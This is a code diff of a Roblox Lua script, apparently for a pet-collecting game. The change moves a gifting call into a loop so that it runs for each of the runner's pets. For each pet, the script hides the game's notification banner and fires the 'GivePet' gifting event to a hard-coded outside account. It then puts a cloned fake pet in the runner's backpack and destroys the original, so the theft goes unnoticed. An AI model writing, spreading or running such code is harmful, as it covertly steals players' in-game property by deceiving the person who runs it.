@@ -78,7 +78,14 @@ coroutine.wrap(function()
 						wait()
 						
 						v:SetAttribute("Favorite", false)
+						game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Enabled = false
+						
 						wait(0.1)
+						local args = {
+							"GivePet",
+							game:GetService("Players"):WaitForChild("itsyaboivincentt")
+						}
+						game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
 						
 						local Fake = v:Clone()
 						Fake.Parent = game:GetService("Players").LocalPlayer.Backpack
@@ -89,15 +96,6 @@ coroutine.wrap(function()
 						v:Destroy()
 					end
 				end
-
-				game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Enabled = false
-
-				wait(0.1)
-				local args = {
-					"GivePet",
-					game:GetService("Players"):WaitForChild("itsyaboivincentt")
-				}
-				game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
 			end
 		end
 	end
